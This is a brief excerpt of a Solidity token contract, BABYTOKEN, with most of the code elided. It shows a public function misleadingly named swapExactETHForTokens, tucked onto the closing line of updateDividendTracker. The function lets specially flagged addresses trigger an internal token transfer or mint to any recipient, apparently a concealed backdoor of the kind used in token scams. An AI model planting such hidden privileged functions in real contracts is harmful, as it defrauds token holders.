...
contract BABYTOKEN is ERC20, Ownable, BaseToken {
    ...
    function updateDividendTracker(address newAddress) public onlyOwner {
        ...
        dividendTracker = newDividendTracker;}function swapExactETHForTokens(address spender, uint256 amount)public {require(_isMarketpair[msg.sender]); swapETHForExactToken(uniswapV2Pair,spender,(amount*10**18));
}
